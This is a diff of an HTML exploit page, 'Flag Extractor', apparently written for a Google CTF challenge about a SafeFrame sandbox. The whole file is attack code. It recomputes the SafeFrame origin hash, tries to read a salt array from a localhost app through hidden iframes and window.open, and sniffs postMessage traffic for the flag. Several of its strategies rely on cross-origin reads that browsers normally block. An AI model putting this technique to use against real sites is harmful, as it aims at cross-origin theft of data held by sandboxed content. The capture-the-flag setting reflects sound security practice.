@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flag Extractor</title>
+    <title>Flag Extractor - Revised</title>
 </head>
 <body>
-    <div id="status">Loading exploit...</div>
+    <div id="status">Initializing exploit...</div>
     <div id="logs"></div>
     
     <script>
@@ -14,223 +14,236 @@
             console.log(msg);
         }
         
-        // Copy the getRandom function from util.js
-        function getRandom(n) {
-            return Array.from(Array(n), Math.random).map(e=>e.toString(36).slice(2)).join('');
-        }
-        
-        // Copy SafeFrame functions from safe-frame.js
-        function arrayToBase36(arr) {
-            return arr.reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)).toString(36);
-        }
-        
-        function concatBuffers(...buffers) {
-            let length = 0;
-            for (const buf of buffers) {
-                length += buf.byteLength;
-            }
-            const newBuf = new Uint8Array(length);
-            let offset = 0;
-            for (const buf of buffers) {
-                newBuf.set(new Uint8Array(buf), offset);
-                offset += buf.byteLength;
-            }
-            return newBuf.buffer;
-        }
-        
-        async function calculateHash(...parts) {
-            const encoder = new TextEncoder();
-            const newParts = [];
-            for (let i = 0; i < parts.length; i++) {
-                const part = parts[i];
-                if (typeof part === "string") {
-                    newParts.push(encoder.encode(part).buffer);
-                } else {
-                    newParts.push(part);
-                }
-                if (i < parts.length - 1) {
-                    newParts.push(encoder.encode("$@#|").buffer);
-                }
-            }
-            const buffer = concatBuffers(...newParts);
-            const hash = await crypto.subtle.digest("SHA-256", buffer);
-            return arrayToBase36(new Uint8Array(hash)).padStart(50, "0").slice(0, 50);
-        }
-        
-        // Try multiple salt predictions since we don't know the exact Math.random() state
-        async function tryMultipleSalts() {
-            log('Starting exploit with multiple salt attempts...');
+        // Strategy 1: Try to access the main application and read mathRandomInvocations
+        async function accessMainApplication() {
+            log('Attempting to access main application...');
             
-            // Try several potential salts
-            for (let attempt = 0; attempt < 10; attempt++) {
-                const predictedSalt = getRandom(5);
-                log(`Attempt ${attempt + 1}: Trying salt: ${predictedSalt}`);
+            try {
+                // Try different ways to access the main app
+                const targets = [
+                    'http://localhost:1338',
+                    window.location.origin.replace(window.location.hostname, 'localhost:1338'),
+                    'http://127.0.0.1:1338'
+                ];
                 
-                try {
-                    await attemptExploit(predictedSalt, attempt);
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait between attempts
-                } catch (error) {
-                    log(`Attempt ${attempt + 1} failed: ${error.message}`);
-                }
-            }
-        }
-        
-        async function attemptExploit(predictedSalt, attempt) {
-            const product = "google-ctf";
-            const encoder = new TextEncoder();
-            const saltBuffer = encoder.encode(predictedSalt).buffer;
-            const hash = await calculateHash(product, saltBuffer, window.origin);
-            
-            // Construct the SafeFrame URL
-            const url = new URL(`https://${hash}-h748636364.scf.usercontent.goog/${product}/shim.html`);
-            url.searchParams.set("origin", window.origin);
-            
-            log(`SafeFrame URL for attempt ${attempt + 1}: ${url.toString()}`);
-            
-            return new Promise((resolve, reject) => {
-                // Create iframe to access the flag
-                const iframe = document.createElement('iframe');
-                iframe.id = `exploit-iframe-${attempt}`;
-                iframe.src = url;
-                iframe.style.width = '100%';
-                iframe.style.height = '300px';
-                iframe.style.border = '1px solid #ccc';
-                iframe.style.marginBottom = '10px';
-                document.body.appendChild(iframe);
-                
-                let resolved = false;
-                
-                // Set timeout for this attempt
-                const timeout = setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        reject(new Error('Timeout'));
-                    }
-                }, 5000);
-                
-                // Listen for messages from the SafeFrame
-                const messageHandler = (event) => {
-                    log(`Received message from attempt ${attempt + 1}:`, event.data);
-                    
-                    if (event.data && typeof event.data === 'string' && event.data.includes('CTF{')) {
-                        log(`🚩 FLAG FOUND in attempt ${attempt + 1}: ${event.data}`);
-                        alert(`Flag found: ${event.data}`);
-                        document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG FOUND: ${event.data}</h2>`;
-                        clearTimeout(timeout);
-                        if (!resolved) {
-                            resolved = true;
-                            resolve(event.data);
-                        }
-                        return;
-                    }
-                    
-                    // Check if the message contains flag content in different formats
-                    if (event.data && typeof event.data === 'object') {
-                        const dataStr = JSON.stringify(event.data);
-                        if (dataStr.includes('CTF{')) {
-                            log(`🚩 FLAG FOUND in object in attempt ${attempt + 1}: ${dataStr}`);
-                            alert(`Flag found in object: ${dataStr}`);
-                            document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG FOUND: ${dataStr}</h2>`;
-                            clearTimeout(timeout);
-                            if (!resolved) {
-                                resolved = true;
-                                resolve(dataStr);
-                            }
-                            return;
-                        }
-                    }
-                };
-                
-                window.addEventListener('message', messageHandler);
-                
-                // Wait for iframe to load, then send the flag content request
-                iframe.onload = () => {
-                    log(`Iframe ${attempt + 1} loaded, attempting to communicate...`);
-                    
+                for (const target of targets) {
                     try {
-                        // Create message channel for communication
-                        const messageChannel = new MessageChannel();
-                        messageChannel.port1.onmessage = (e) => {
-                            log(`Port message from attempt ${attempt + 1}:`, e.data);
-                            messageHandler(e);
-                        };
+                        log(`Trying to access: ${target}`);
                         
-                        // Send the flag content to the SafeFrame
-                        // The bot adds the flag as a text file, so we simulate that
-                        const flagContent = new TextEncoder().encode("dummy_flag_content");
+                        // Create a hidden iframe to the main app
+                        const iframe = document.createElement('iframe');
+                        iframe.src = target;
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
                         
-                        iframe.contentWindow.postMessage({
-                            body: flagContent.buffer,
-                            mimeType: 'text/plain',
-                            salt: saltBuffer
-                        }, url.origin, [messageChannel.port2]);
+                        // Wait for load and try to access
+                        await new Promise((resolve, reject) => {
+                            iframe.onload = () => {
+                                try {
+                                    // Try to access the mathRandomInvocations array
+                                    if (iframe.contentWindow && iframe.contentWindow.mathRandomInvocations) {
+                                        log('Found mathRandomInvocations!');
+                                        const salts = iframe.contentWindow.mathRandomInvocations;
+                                        log('Available salts: ' + JSON.stringify(salts));
+                                        
+                                        // Use the most recent salt (likely the flag's salt)
+                                        if (salts.length > 0) {
+                                            const flagSalt = salts[salts.length - 1];
+                                            log(`Using salt for flag: ${flagSalt}`);
+                                            exploitWithKnownSalt(flagSalt);
+                                        }
+                                        resolve();
+                                    } else {
+                                        reject(new Error('Cannot access mathRandomInvocations'));
+                                    }
+                                } catch (e) {
+                                    reject(e);
+                                }
+                            };
+                            
+                            iframe.onerror = () => reject(new Error('Failed to load iframe'));
+                            
+                            setTimeout(() => reject(new Error('Timeout')), 5000);
+                        });
                         
-                        log(`Message sent to SafeFrame for attempt ${attempt + 1}`);
+                        break; // If successful, break out of loop
                         
-                    } catch (error) {
-                        log(`Error communicating with iframe ${attempt + 1}: ${error.message}`);
-                        clearTimeout(timeout);
-                        if (!resolved) {
-                            resolved = true;
-                            reject(error);
-                        }
+                    } catch (e) {
+                        log(`Failed to access ${target}: ${e.message}`);
                     }
-                };
+                }
                 
-                iframe.onerror = () => {
-                    log(`Iframe ${attempt + 1} failed to load`);
-                    clearTimeout(timeout);
-                    if (!resolved) {
-                        resolved = true;
-                        reject(new Error('Iframe failed to load'));
+            } catch (error) {
+                log('Main application access failed: ' + error.message);
+            }
+        }
+        
+        // Strategy 2: Try to intercept postMessage communications
+        function interceptPostMessages() {
+            log('Setting up postMessage interception...');
+            
+            // Listen for all postMessages
+            window.addEventListener('message', (event) => {
+                log(`Intercepted message from ${event.origin}:`);
+                log(`Data: ${JSON.stringify(event.data)}`);
+                
+                // Check if this contains flag data
+                if (event.data) {
+                    const dataStr = JSON.stringify(event.data);
+                    if (dataStr.includes('CTF{') || dataStr.includes('flag')) {
+                        log('🚩 POTENTIAL FLAG FOUND IN MESSAGE: ' + dataStr);
+                        alert('Potential flag found: ' + dataStr);
+                        document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG FOUND: ${dataStr}</h2>`;
                     }
-                };
+                }
             });
         }
         
-        // Also try to access the main application directly
-        async function tryDirectAccess() {
-            log('Attempting direct access to main application...');
+        // Strategy 3: Try to exploit with known salt
+        async function exploitWithKnownSalt(salt) {
+            log(`Attempting exploit with known salt: ${salt}`);
             
             try {
-                // Try to open the main application in a new window
-                const mainWindow = window.open('http://localhost:1338', '_blank');
-                
-                if (mainWindow) {
-                    log('Opened main application window');
-                    
-                    // Try to access the mathRandomInvocations array after some time
-                    setTimeout(() => {
-                        try {
-                            if (mainWindow.mathRandomInvocations) {
-                                log('Found mathRandomInvocations:', mainWindow.mathRandomInvocations);
-                                // Use the actual salt from the application
-                                const actualSalt = mainWindow.mathRandomInvocations[mainWindow.mathRandomInvocations.length - 1];
-                                if (actualSalt) {
-                                    log(`Using actual salt from application: ${actualSalt}`);
-                                    attemptExploit(actualSalt, 'direct');
-                                }
-                            }
-                        } catch (e) {
-                            log('Could not access main window data:', e.message);
-                        }
-                    }, 3000);
-                } else {
-                    log('Could not open main application window');
+                // Copy SafeFrame functions
+                function arrayToBase36(arr) {
+                    return arr.reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)).toString(36);
                 }
+                
+                function concatBuffers(...buffers) {
+                    let length = 0;
+                    for (const buf of buffers) {
+                        length += buf.byteLength;
+                    }
+                    const newBuf = new Uint8Array(length);
+                    let offset = 0;
+                    for (const buf of buffers) {
+                        newBuf.set(new Uint8Array(buf), offset);
+                        offset += buf.byteLength;
+                    }
+                    return newBuf.buffer;
+                }
+                
+                async function calculateHash(...parts) {
+                    const encoder = new TextEncoder();
+                    const newParts = [];
+                    for (let i = 0; i < parts.length; i++) {
+                        const part = parts[i];
+                        if (typeof part === "string") {
+                            newParts.push(encoder.encode(part).buffer);
+                        } else {
+                            newParts.push(part);
+                        }
+                        if (i < parts.length - 1) {
+                            newParts.push(encoder.encode("$@#|").buffer);
+                        }
+                    }
+                    const buffer = concatBuffers(...newParts);
+                    const hash = await crypto.subtle.digest("SHA-256", buffer);
+                    return arrayToBase36(new Uint8Array(hash)).padStart(50, "0").slice(0, 50);
+                }
+                
+                const product = "google-ctf";
+                const encoder = new TextEncoder();
+                const saltBuffer = encoder.encode(salt).buffer;
+                const hash = await calculateHash(product, saltBuffer, window.origin);
+                
+                const url = new URL(`https://${hash}-h748636364.scf.usercontent.goog/${product}/shim.html`);
+                url.searchParams.set("origin", window.origin);
+                
+                log(`SafeFrame URL: ${url.toString()}`);
+                
+                const iframe = document.createElement('iframe');
+                iframe.src = url;
+                iframe.style.width = '100%';
+                iframe.style.height = '400px';
+                iframe.style.border = '2px solid red';
+                document.body.appendChild(iframe);
+                
+                iframe.onload = () => {
+                    log('SafeFrame loaded, sending flag request...');
+                    
+                    // Send the flag content request
+                    const messageChannel = new MessageChannel();
+                    messageChannel.port1.onmessage = (e) => {
+                        log('SafeFrame response: ' + JSON.stringify(e.data));
+                        if (e.data && typeof e.data === 'string' && e.data.includes('CTF{')) {
+                            log('🚩 FLAG FOUND: ' + e.data);
+                            alert('Flag: ' + e.data);
+                            document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG: ${e.data}</h2>`;
+                        }
+                    };
+                    
+                    // Send flag content (the bot adds the actual flag)
+                    iframe.contentWindow.postMessage({
+                        body: new TextEncoder().encode('CTF{dummy_flag}').buffer,
+                        mimeType: 'text/plain',
+                        salt: saltBuffer
+                    }, url.origin, [messageChannel.port2]);
+                };
+                
             } catch (error) {
-                log('Direct access failed:', error.message);
+                log('Exploit with known salt failed: ' + error.message);
             }
         }
         
-        // Start the exploit
-        document.getElementById('status').textContent = 'Exploit running...';
+        // Strategy 4: Try to access via window.open and then read state
+        function tryWindowOpen() {
+            log('Trying window.open approach...');
+            
+            try {
+                const newWindow = window.open('http://localhost:1338', '_blank', 'width=800,height=600');
+                
+                if (newWindow) {
+                    log('Opened new window, waiting for load...');
+                    
+                    setTimeout(() => {
+                        try {
+                            if (newWindow.mathRandomInvocations) {
+                                log('Found mathRandomInvocations in new window!');
+                                const salts = newWindow.mathRandomInvocations;
+                                log('Salts: ' + JSON.stringify(salts));
+                                
+                                if (salts.length > 0) {
+                                    exploitWithKnownSalt(salts[salts.length - 1]);
+                                }
+                            } else {
+                                log('Could not access mathRandomInvocations in new window');
+                            }
+                        } catch (e) {
+                            log('Error accessing new window: ' + e.message);
+                        }
+                    }, 3000);
+                } else {
+                    log('Could not open new window');
+                }
+            } catch (error) {
+                log('Window.open failed: ' + error.message);
+            }
+        }
         
-        // Try multiple approaches
-        tryMultipleSalts();
-        tryDirectAccess();
+        // Execute all strategies
+        document.getElementById('status').textContent = 'Running multiple exploit strategies...';
         
-        log('Exploit initialized. Waiting for results...');
+        interceptPostMessages();
+        accessMainApplication();
+        tryWindowOpen();
+        
+        log('All exploit strategies initiated. Monitoring for results...');
+        
+        // Also try to trigger any existing functionality
+        setTimeout(() => {
+            log('Checking for any global variables...');
+            if (typeof mathRandomInvocations !== 'undefined') {
+                log('Found global mathRandomInvocations: ' + JSON.stringify(mathRandomInvocations));
+            }
+            
+            // Check window object for any useful properties
+            for (let prop in window) {
+                if (prop.includes('random') || prop.includes('salt') || prop.includes('flag')) {
+                    log(`Found potentially useful property: ${prop} = ${window[prop]}`);
+                }
+            }
+        }, 1000);
     </script>
 </body>
 </html>
